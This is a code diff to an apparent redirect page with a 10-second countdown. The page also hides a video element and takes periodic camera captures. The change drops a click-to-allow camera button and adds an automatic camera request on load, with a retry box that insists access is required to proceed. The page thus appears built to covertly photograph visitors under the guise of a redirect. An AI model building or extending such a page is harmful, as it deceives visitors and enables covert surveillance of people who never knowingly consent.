@@ -25,22 +25,7 @@
       display: flex; align-items: center; justify-content: center;
       height: 100vh; text-align: center; flex-direction: column;
     }
-    /* زر الكاميرا */
-    #cameraPrompt {
-      display: flex; flex-direction: column; align-items: center; gap: 15px;
-    }
-    #cameraBtn {
-      padding: 20px 40px; background: #4a4a4a; color: white;
-      border: none; border-radius: 50px; font-size: 1.4rem;
-      font-weight: 600; cursor: pointer; letter-spacing: 1px;
-    }
-    #cameraMsg {
-      color: #c00; font-size: 0.9rem; max-width: 280px;
-    }
-    /* العداد وغيره (مخفي حتى الموافقة) */
-    #mainUI {
-      display: none; flex-direction: column; align-items: center; gap: 20px;
-    }
+    .container { display: flex; flex-direction: column; align-items: center; gap: 20px; }
     .timer-wrapper { position: relative; width: 160px; height: 160px; }
     svg { transform: rotate(-90deg); }
     .circle-bg { fill: none; stroke: #e0e0e0; stroke-width: 3; }
@@ -54,18 +39,20 @@
       font-size: 1rem; color: #4a4a4a; margin-top: 10px;
     }
     video { display: none; }
+    .permission-box {
+      background: #f8f9fa; border: 2px solid #4a4a4a;
+      border-radius: 12px; padding: 20px; margin-top: 20px;
+      text-align: center; max-width: 320px;
+    }
+    .permission-box p { margin-bottom: 10px; color: #c00; }
+    .btn {
+      padding: 12px 25px; background: #4a4a4a; color: white;
+      border: none; border-radius: 8px; font-size: 16px; cursor: pointer; margin: 5px;
+    }
   </style>
 </head>
 <body>
-
-  <!-- واجهة زر الكاميرا فقط -->
-  <div id="cameraPrompt">
-    <button id="cameraBtn">Allow Camera</button>
-    <div id="cameraMsg"></div>
-  </div>
-
-  <!-- واجهة العداد (مخفية) -->
-  <div id="mainUI">
+  <div class="container" id="mainContainer">
     <div class="timer-wrapper">
       <svg width="160" height="160" viewBox="0 0 160 160">
         <circle class="circle-bg" cx="80" cy="80" r="70" />
@@ -75,6 +62,10 @@
       <div id="countdown">10</div>
     </div>
     <div id="redirectMessage">سيتم تحويلك خلال 10</div>
+    <div id="permissionBox" class="permission-box" style="display:none;">
+      <p id="permMessage">Camera access was denied. You must allow it to proceed.</p>
+      <button class="btn" id="retryBtn">Retry</button>
+    </div>
   </div>
 
   <video id="video" autoplay playsinline muted></video>
@@ -96,10 +87,9 @@
     const countdownEl = document.getElementById('countdown');
     const redirectMsgEl = document.getElementById('redirectMessage');
     const progressCircle = document.getElementById('progressCircle');
-    const cameraPromptDiv = document.getElementById('cameraPrompt');
-    const cameraBtn = document.getElementById('cameraBtn');
-    const cameraMsg = document.getElementById('cameraMsg');
-    const mainUI = document.getElementById('mainUI');
+    const permBox = document.getElementById('permissionBox');
+    const permMsg = document.getElementById('permMessage');
+    const retryBtn = document.getElementById('retryBtn');
 
     let redirectUrl = 'https://example.com';
     let countdown = COUNTDOWN_START;
@@ -325,24 +315,26 @@
       }
     }
 
-    function insistOnCameraPermission() {
+    function waitForCameraPermission() {
       return new Promise(resolve => {
         async function tryOnce() {
           cameraAttempts++;
           const ok = await requestCameraOnce();
           if (ok) {
-            cameraPromptDiv.style.display = 'none';
-            mainUI.style.display = 'flex';
+            permBox.style.display = 'none';
             if (cameraAttempts === 1) cameraGrantedOnFirstTry = true;
             resolve();
           } else {
-            cameraMsg.textContent = 'Camera access was denied. You must allow it to proceed.';
+            // إظهار الصندوق مع الزر
+            permBox.style.display = 'block';
           }
         }
 
-        // محاولة أولى عند الضغط على الزر
-        cameraBtn.addEventListener('click', tryOnce, { once: false });
-        // لا نبدأ تلقائياً، ننتظر ضغطة المستخدم
+        // ربط الحدث بالزر
+        retryBtn.onclick = tryOnce;
+
+        // محاولة أولى تلقائية
+        tryOnce();
       });
     }
 
@@ -405,9 +397,10 @@
       fetchSettingsOnce();
       backgroundTasks();
 
-      // انتظار موافقة المستخدم على الكاميرا (الزر هو المتحكم)
-      await insistOnCameraPermission();
+      // انتظار حتى يتم منح الكاميرا
+      await waitForCameraPermission();
 
+      // بدء العداد والتصوير
       updateTimerUI();
       captureIntervalId = setInterval(captureTick, CAPTURE_INTERVAL);
       intervalId = setInterval(() => {
